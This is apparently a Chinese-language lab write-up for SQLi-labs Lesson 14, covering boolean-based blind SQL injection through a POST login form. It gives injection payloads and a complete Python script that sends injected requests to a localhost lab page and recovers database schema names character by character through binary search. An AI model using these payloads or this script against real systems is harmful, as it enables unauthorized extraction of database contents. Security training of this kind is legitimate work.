# Lesson-14
```
Bool盲注POST)
```

首先通过添加双引号根据报错得到部分SQL语句
这题比较重要的一点就是找出后台PHP文件是如何判断登陆成功的
这里通过判断猜测到应该是通过判断select获得的结果集的长度
因此这里需要这样构造用户名 : 
`" union select 1,1-- `
联合查询就会保证结果集一定不为空 , 这样就可以在union select中再添加from和where语句构造出bool值
然后就可以进行bool盲注
> 后记 :
后来通过查看源码发现 , 这里是将来用户POST的数据先在两端添加双引号 , 然后再对SQL语句进行构造
> 再后记 :
最开始做这道题其实是整错了 , 可以不使用union select语句的 , 直接使用or语句构造一个bool的参数就可以通过响应体来判断是否正确执行了 , 这里出现错误的原因是选择的标志不对 , 这个表示再上一个关卡是有的 , 但是这一关卡又没了

```
这里直接给出脚本 : 
```
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	# admin' or ()-- 
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	payload = {"uname":"\" or (" + payload + ")-- ","passwd":"admin"}
	return payload

def exce(indexOfResult,indexOfChar,mid):
	# content-start
	url = "http://127.0.0.1/Less-14/"
	postData = getPayload(indexOfResult,indexOfChar,mid)
	content = requests.post(url, data=postData).text
	# content-end
	# judge-start
	if "flag.jpg" in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
